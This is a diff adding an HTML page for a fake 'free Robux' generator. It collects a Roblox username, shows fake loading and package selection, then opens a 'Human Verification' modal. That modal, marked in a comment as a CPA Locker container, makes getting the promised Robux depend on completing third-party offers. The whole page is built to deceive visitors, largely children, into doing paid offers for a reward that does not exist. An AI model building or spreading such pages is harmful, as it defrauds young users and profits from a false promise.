@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Roblox Packages</title>
+<link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+
+  <div class="navbar">
+    <div>☰</div>
+    <div class="navbar-menu">
+      <span>Discover</span>
+      <span>Marketplace</span>
+      <span>Roblox</span>
+    </div>
+  </div>
+
+  <div class="banner">
+    <img src="https://i.imgur.com/7QpNcqP.jpg" alt="Roblox Banner" />
+    <div class="banner-overlay">
+      Roblox allows you to purchase upgrades for your avatar or buy special abilities in experiences.
+    </div>
+  </div>
+
+  <div class="container">
+    <!-- Username form -->
+    <form id="usernameForm">
+      <h2>Roblox Username</h2>
+      <input type="text" id="usernameInput" placeholder="Enter username" required />
+      <button type="submit">Next</button>
+    </form>
+
+    <!-- Loading -->
+    <div class="loading" id="loading" style="display:none;">
+      <img src="https://i.imgur.com/MT5Kk8A.png" alt="Loading" />
+      <p id="loadingText"></p>
+    </div>
+
+    <!-- Packages -->
+    <div class="packages" id="packages" style="display:none;">
+      <h2>Select Roblox Package</h2>
+      <div class="package-list" id="packageList"></div>
+    </div>
+  </div>
+
+  <!-- Verification Modal -->
+  <div class="modal-backdrop" id="verificationModal" style="display:none;">
+    <div class="modal">
+      <div class="modal-content">
+        <img src="https://i.imgur.com/cfFSwdE.png" alt="Verification" />
+        <h2>Last step</h2>
+        <p>Please verify that you are not a robot to claim Roblox!</p>
+        <div class="verification-box">
+          <h3>Human Verification</h3>
+          <p>To get free Robux, you must complete the offer by following all the required steps</p>
+          <!-- CPA Locker container -->
+          <div id="fdef6">
+            <p style="color:#555;">Loading verification locker...</p>
+          </div>
+        </div>
+        <p class="waiting-text">Waiting for verification...</p>
+      </div>
+    </div>
+  </div>
+
+<script src="script.js"></script>
+</body>
+</html>
